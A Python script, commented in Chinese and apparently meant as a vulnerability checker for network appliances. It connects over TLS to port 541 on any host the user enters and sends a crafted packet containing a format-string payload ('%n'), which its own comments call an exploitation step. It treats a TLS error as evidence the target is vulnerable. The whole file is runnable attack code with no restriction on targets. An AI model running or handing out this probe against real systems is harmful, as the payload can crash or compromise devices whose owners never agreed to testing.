import socket
import ssl
import struct

# 检查目标主机是否存在漏洞
def check_vulnerability(hostname):
    # 创建SSL上下文，指定TLS 1.2协议
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.check_hostname = False  # 不验证主机名
    context.verify_mode = ssl.CERT_NONE  # 不验证证书
    context.options |= ssl.OP_NO_COMPRESSION  # 禁用压缩，增加安全性

    # 使用socket连接到目标主机
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(5)  # 设置连接超时时间为5秒
        try:
            # 尝试连接到指定主机和端口541
            sock.connect((hostname, 541))
        except socket.error as e:
            # 连接失败时输出错误信息
            print(f"[-] 无法连接到 {hostname}: {e}")
            return False

        try:
            # 包装socket为SSL连接
            with context.wrap_socket(sock, server_hostname=hostname, suppress_ragged_eofs=True) as ssock:
                initial_data = ssock.recv(1024)  # 接收初始数据
                if not initial_data:
                    print("[-] 从服务器未接收到初始数据。")
                    return False

                # 解析初始数据中的包头
                if len(initial_data) >= 8:
                    pkt_flags = struct.unpack('i', initial_data[:4])[0]  # 解析包的标志字段
                    pkt_len = struct.unpack('i', initial_data[4:8])[0] - 2  # 解析包的长度字段
                else:
                    print("[-] 接收到的初始数据长度太短。")
                    return False

                # 接收完整的有效载荷数据
                payload = ssock.recv(pkt_len - 8)
                if len(payload) < pkt_len - 8:
                    print("[-] 接收到的不完整的有效载荷数据。")
                    return False

                # 构造格式化字符串，进行漏洞利用
                format_string_payload = b"reply 200\r\nrequest=auth\r\nauthip=%n\r\n\r\n\x00"
                packet = b''
                packet += 0x0001e034.to_bytes(4, 'little')  # 添加包的标识符
                packet += (len(format_string_payload) + 8).to_bytes(4, 'big')  # 包长度
                packet += format_string_payload  # 添加格式化字符串有效载荷

                ssock.send(packet)  # 发送构造的数据包

                response = ssock.recv(1024)  # 接收服务器的响应
                if response:
                    print("[+] 设备可能已修补漏洞 - 收到响应。")
                    return False
                else:
                    print("[+] 未收到响应 - 需要进一步分析。")
                    return False
        except ssl.SSLError as ssl_err:
            # 捕获SSL错误并判断是否为漏洞特征错误
            if "tlsv1 alert" in str(ssl_err).lower() or "unexpected message" in str(ssl_err).lower():
                print(f"[+] 设备 {hostname} 可能存在漏洞，连接中断符合预期。")
                return True
            else:
                print(f"[-] 意外的SSL错误: {ssl_err}")
                return False
        except socket.error as sock_err:
            # 捕获socket错误
            print(f"[-] Socket 错误: {sock_err}")
            return False

# 主程序入口
def main():
    while True:
        # 提示用户输入目标主机名
        hostname = input("请输入要检查的主机名（输入'exit'退出）：")
        if hostname.lower() == 'exit':
            break  # 用户输入'exit'时退出

        # 检查该主机是否存在漏洞
        is_vulnerable = check_vulnerability(hostname)
        if is_vulnerable:
            print(f"[!] 警告: {hostname} 存在漏洞！")
        else:
            print(f"[+] {hostname} 似乎已经修补。")

if __name__ == "__main__":
    main()
